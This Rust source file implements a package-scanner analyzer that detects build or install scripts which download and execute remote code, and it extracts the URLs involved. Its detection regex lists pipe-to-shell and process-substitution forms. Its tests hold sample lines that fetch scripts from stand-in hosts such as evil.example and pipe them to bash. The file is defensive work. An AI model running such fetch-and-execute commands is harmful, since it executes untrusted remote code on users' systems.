//! Remote-execution boundary detection.
//!
//! A package can keep its malicious payload *outside* any package by fetching
//! and running code from an external URL at build/install time. The scanner
//! deliberately does **not** follow that reference: downloading or running it
//! would turn the scanner itself into the execution vector, and the dependency
//! graph / SBOM would be chasing attacker-controlled code.
//!
//! Instead this analyzer detects the fetch-and-execute, extracts the URL(s),
//! and emits a loud finding. Downstream, such a package is marked as an
//! **opaque boundary**: the SBOM cannot account for what runs beyond it, by
//! design -- the correct message to the user is "this runs code from <url>,
//! you probably don't want that", not a fabricated "complete" SBOM.

use super::SecurityAnalyzer;
use crate::error::Result;
use crate::textutil::logical_lines;
use crate::types::{AnalysisContext, Category, Finding, Location, Severity};
use async_trait::async_trait;
use lazy_static::lazy_static;
use regex::Regex;

lazy_static! {
    /// A line that downloads and immediately executes remote content.
    static ref FETCH_EXEC: Regex = Regex::new(
        r#"(?x)
        (curl|wget|aria2c|fetch)\b[^\n]*\|\s*(ba|z|k|c|d|tc|fi)?sh\b   # download | shell
        | (curl|wget|aria2c|fetch)\b[^\n]*\|\s*(python[23]?|perl|ruby|node|php|pwsh) # download | interp
        | (ba|z|k|c|d|tc|fi)?sh\s+<\(\s*(curl|wget|fetch)\b            # sh <(curl ...)
        | source\s+<\(\s*(curl|wget|fetch)\b                          # source <(curl ...)
        | \beval\s+["']?\$\(\s*(curl|wget|fetch)\b                    # eval "$(curl ...)"
        | \.\s+<\(\s*(curl|wget|fetch)\b                              # . <(curl ...)
        "#
    ).unwrap();
    /// Extract http(s) URLs (stop at shell/quote boundaries).
    static ref URL: Regex = Regex::new(r#"https?://[^\s"'`|)><(]+"#).unwrap();
}

/// Trim trailing shell punctuation a URL regex may capture.
fn clean_url(u: &str) -> String {
    u.trim_end_matches([';', '&', ',', '.', '\\', '}']).to_string()
}

/// Detects remote fetch-and-execute and extracts the external URL(s).
pub struct RemoteExecAnalyzer;

impl RemoteExecAnalyzer {
    /// Create a new analyzer.
    pub fn new() -> Self {
        Self
    }

    fn scan(&self, text: &str, file: &std::path::Path, in_install: bool) -> Vec<Finding> {
        let mut findings = Vec::new();
        // Splice backslash-newline continuations so `curl evil \`<nl>`| sh`
        // cannot escape the fetch-exec pattern by living on two physical lines.
        for (phys_line, line) in logical_lines(text) {
            let line = line.as_str();
            let trimmed = line.trim_start();
            if trimmed.starts_with('#') || !FETCH_EXEC.is_match(line) {
                continue;
            }
            let idx = phys_line - 1;
            let urls: Vec<String> = URL.find_iter(line).map(|m| clean_url(m.as_str())).collect();
            let where_ = if in_install { " (install script)" } else { "" };
            let url_msg = if urls.is_empty() {
                "an external source".to_string()
            } else {
                urls.join(", ")
            };

            findings.push(Finding {
                id: "EXEC-REMOTE".to_string(),
                severity: Severity::Critical,
                category: Category::MaliciousCode,
                title: format!("Fetches and runs code from {url_msg}{where_}"),
                description: format!(
                    "This package downloads and executes code from {url_msg} at build/install \
                     time. The scanner does NOT follow this reference (doing so could run the \
                     remote code), so what actually executes is unknown -- treat it as untrusted. \
                     The dependency tree/SBOM cannot account for code fetched at runtime."
                ),
                location: Location {
                    file: file.to_path_buf(),
                    line: Some(idx + 1),
                    column: None,
                    snippet: Some(line.trim().to_string()),
                },
                recommendation:
                    "Do not build. A package that pulls and runs code from an external URL is \
                     opaque by design; obtain the software from a source that ships its real code."
                        .to_string(),
                cwe_id: Some("CWE-494".to_string()),
                metadata: serde_json::json!({
                    "remote_urls": urls,
                    "opaque_boundary": true,
                }),
            });
        }
        findings
    }
}

impl Default for RemoteExecAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl SecurityAnalyzer for RemoteExecAnalyzer {
    async fn analyze(&self, context: &AnalysisContext) -> Result<Vec<Finding>> {
        let mut findings = self.scan(&context.pkgbuild.raw_content, &context.file_path, false);
        if let Some(install) = &context.install_script {
            findings.extend(self.scan(&install.content, &install.path, true));
        }
        Ok(findings)
    }

    fn name(&self) -> &str {
        "remote_exec"
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    #[test]
    fn detects_curl_pipe_sh_and_extracts_url() {
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "build() {\n  curl -fsSL https://evil.example/x.sh | bash\n}",
            Path::new("PKGBUILD"),
            false,
        );
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].id, "EXEC-REMOTE");
        let urls = f[0].metadata["remote_urls"].as_array().unwrap();
        assert_eq!(urls[0], "https://evil.example/x.sh");
    }

    #[test]
    fn detects_process_substitution() {
        let a = RemoteExecAnalyzer::new();
        let f = a.scan("bash <(curl -s https://x.io/i)", Path::new("PKGBUILD"), false);
        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"));
    }

    #[test]
    fn detects_continuation_split_fetch_exec() {
        // CR-3: the pipe-to-shell is on a backslash-continuation line.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "build() {\n  curl -fsSL https://evil.example/x \\\n    | bash\n}",
            Path::new("PKGBUILD"),
            false,
        );
        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "continuation-split fetch|exec must be caught");
    }

    #[test]
    fn ignores_plain_download_without_exec() {
        // A source download (no exec) must not be flagged here; that's normal.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan("curl -O https://example.com/src.tar.gz", Path::new("PKGBUILD"), false);
        assert!(f.is_empty());
    }
}
